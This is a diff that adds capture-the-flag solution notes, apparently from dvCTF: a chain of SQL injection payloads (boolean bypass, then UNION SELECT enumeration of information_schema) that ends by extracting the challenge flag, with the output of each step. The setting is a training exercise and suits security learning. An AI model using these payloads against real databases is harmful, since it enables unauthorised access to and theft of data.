@@ -1,0 +1,16 @@
+Astrid" or 1=1-- -
+
+Astrid" union select 1,2,3-- -
+
+Astrid" union select (select group_concat(schema_name) from information_schema.schemata),2,3-- -
+	information_schema,lajoute
+
+
+Astrid" union select (select group_concat(table_name) from information_schema.tables where table_schema='lajoute'),2,3-- -
+	members,supa_secret_table
+
+Astrid" union select (select group_concat(column_name) from information_schema.columns where table_schema='lajoute' AND table_name='supa_secret_table'),2,3-- -
+	id,flag	
+
+Astrid" union select (select flag from supa_secret_table),2,3-- -
+	dvCTF{1_h0p3_u_d1dnt_us3_sqlm4p}	
